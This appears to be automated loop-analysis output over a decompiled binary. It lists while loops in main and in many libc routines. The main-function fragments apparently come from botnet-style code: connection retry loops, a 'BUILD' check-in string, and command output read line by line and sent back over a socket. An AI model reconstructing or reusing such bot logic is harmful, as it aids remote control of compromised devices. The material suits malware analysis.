		__GI_inet_ntoa(&v243, 0x10030000);
		sockprintf(v241, (int32_t)"BUILD %s:%s", v244);
		__libc_waitpid(v220, (int32_t)&v217, 0);
		zprintf((int32_t)"fork failed\n", 0x10010000);
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 136 @ main ====================================
++++++++ WHILE START : 24644 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24650 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 137 @ main ====================================
++++++++ WHILE START : 24667 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24673 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 138 @ main ====================================
++++++++ WHILE START : 24698 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24704 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 139 @ main ====================================
++++++++ WHILE START : 24721 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24727 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 140 @ main ====================================
++++++++ WHILE START : 24734 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24751 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v222, 1024, v286) == 0) {
		fdpclose(v286);
		sockprintf(v214, (int32_t)"%s", v222);
=============================WHILE LOOPS ID : 145 @ _vfprintf_internal ====================================
++++++++ WHILE START : 35084 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 35771 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 148 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 37144 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 37959 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 150 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 38925 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 38953 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 153 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 39540 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 39609 
++++++++ INTRESTING INSTRUCTIONS :  
		char v222 = getc_unlocked((int16_t *)a3, v218); // 0x1000e988
=============================WHILE LOOPS ID : 167 @ strstr ====================================
++++++++ WHILE START : 43184 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 43247 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 175 @ gethostbyname_r ====================================
++++++++ WHILE START : 47824 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 47855 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 176 @ gethostbyname_r ====================================
++++++++ WHILE START : 47965 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 47996 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 177 @ gethostbyname_r ====================================
++++++++ WHILE START : 48100 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 48131 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 178 @ gethostbyname_r ====================================
++++++++ WHILE START : 48233 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 48269 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 179 @ gethostbyname_r ====================================
++++++++ WHILE START : 48378 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 48412 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 183 @ srandom_r ====================================
++++++++ WHILE START : 55723 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 55764 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)v217, (int32_t)&v218);
		__GI_random_r((int32_t *)v217, (int32_t)&v218);
=============================WHILE LOOPS ID : 184 @ _stdlib_strto_l ====================================
++++++++ WHILE START : 56962 
++++++++ WHILE FUNCTION : _stdlib_strto_l 
++++++++ WHILE END : 57231 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 189 @ __stdio_WRITE ====================================
++++++++ WHILE START : 63592 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 63677 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 192 @ _fpmaxtostr ====================================
++++++++ WHILE START : 65476 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 69151 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 200 @ __GI_strpbrk ====================================
++++++++ WHILE START : 71421 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 71451 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 201 @ inet_aton ====================================
++++++++ WHILE START : 71680 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 71753 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 202 @ __dns_lookup ====================================
++++++++ WHILE START : 72010 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 72637 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_close(v229);
		if (inet_pton(10, (char *)v239, (int32_t)&v240) < 1) {
		inet_addr(v239);
		int32_t v243 = socket((int32_t)v242, 2, 17); // 0x10012b90
		if (__libc_connect(v226, 28, 28) > -1) {
		__libc_send(v213, v210, result + v246, 0);
		int32_t v247 = __libc_recv(v213, v210, 512, 0); // 0x10012c10
		__libc_close(v215);
		free();
		free();
		while (true) {
		__libc_close(v213);
		free();
		free();
		free();
		free();
		free();
		free();
		__libc_close(v213);
		free();
		free();
		free();
		__libc_close(v213);
		free();
		free();
		free();
		__libc_close(v213);
		free();
		free();
		free();
		__libc_close(v213);
		free();
		free();
		free();
		__libc_close(v213);
		free();
		free();
		free();
		free();
		__libc_close(v215);
		free();
		free();
		__libc_close(v215);
		free();
		free();
		__libc_close(v215);
		free();
		free();
=============================WHILE LOOPS ID : 203 @ __open_nameservers ====================================
++++++++ WHILE START : 72987 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 73185 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v219, 128, v215) == 0) {
		__GI_fclose((int16_t *)v214);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		free();
		free();
		while (true) {
=============================WHILE LOOPS ID : 205 @ __GI_strncat ====================================
++++++++ WHILE START : 77456 
++++++++ WHILE FUNCTION : __GI_strncat 
++++++++ WHILE END : 77505 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 211 @ inet_pton ====================================
++++++++ WHILE START : 78671 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 78916 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		if (inet_pton4(v222, v220) > 0) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 214 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 79546 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 79693 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_ntop4(a2 + 12, v255, v256 - v255 + 86) == 0) {
		v253 = sprintf(v255, (int32_t)"%x", v252, v216, v248, v249, v216, (int32_t)&v254);
		if (inet_ntop4(a2 + 12, v255, v256 - v255 + 86) == 0) {
		v253 = sprintf(v250, (int32_t)"%x", v252, v216, v248, v249, v216, (int32_t)&v254);
=============================WHILE LOOPS ID : 217 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 81467 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 81480 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v217, v219, a1) != 0) {
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 218 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 81522 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 81535 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v217, v219, a1) != 0) {
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 219 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 81571 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 81803 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v217, v219, a1) != 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (__GI_strcasecmp(a2, v253) == 0) {
		if (inet_pton(2, (char *)v255, v218) > 0) {
		__GI_fclose((int16_t *)a1);
		if (inet_pton(10, (char *)v256, v216) > 0) {
		__GI_fclose((int16_t *)a1);
		__GI_fclose((int16_t *)a1);
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 220 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 81854 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 81867 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v217, v219, a1) != 0) {
		__GI_fclose((int16_t *)a1);
